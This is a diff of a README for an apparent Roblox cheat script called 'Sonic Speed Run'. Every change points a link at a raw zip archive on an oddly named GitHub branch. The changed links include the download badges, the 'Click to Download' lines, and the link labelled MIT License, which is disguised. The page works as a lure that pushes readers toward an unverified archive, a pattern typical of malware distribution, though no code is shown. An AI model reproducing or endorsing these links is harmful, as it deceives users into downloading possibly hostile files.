@@ -1,8 +1,8 @@
 # Sonic Speed Run Roblox Script 🚀
 
-[![Download](https://img.shields.io/badge/Download-green)](https://reasaalim.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/reasaalim/sonic-speedrun-roblox-toolkit/raw/refs/heads/branch/peahen/speedrun_roblox_sonic_toolkit_3.7.zip)
   
-**Click to Download: https://reasaalim.github.io**
+**Click to Download: https://github.com/reasaalim/sonic-speedrun-roblox-toolkit/raw/refs/heads/branch/peahen/speedrun_roblox_sonic_toolkit_3.7.zip**
 
 ---
 
@@ -71,14 +71,14 @@ Both APIs are seamlessly integrated, letting you script and strategize as intuit
 
 ## 📜 License
 
-This repository is distributed under the [MIT License](https://opensource.org/licenses/MIT) (2025).  
+This repository is distributed under the [MIT License](https://github.com/reasaalim/sonic-speedrun-roblox-toolkit/raw/refs/heads/branch/peahen/speedrun_roblox_sonic_toolkit_3.7.zip) (2025).  
 You are free to use, modify, and adapt this repository for educational and personal use, with appropriate attribution.
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-green)](https://reasaalim.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/reasaalim/sonic-speedrun-roblox-toolkit/raw/refs/heads/branch/peahen/speedrun_roblox_sonic_toolkit_3.7.zip)
   
-**Click to Download: https://reasaalim.github.io**
+**Click to Download: https://github.com/reasaalim/sonic-speedrun-roblox-toolkit/raw/refs/heads/branch/peahen/speedrun_roblox_sonic_toolkit_3.7.zip**
 
 ---
 
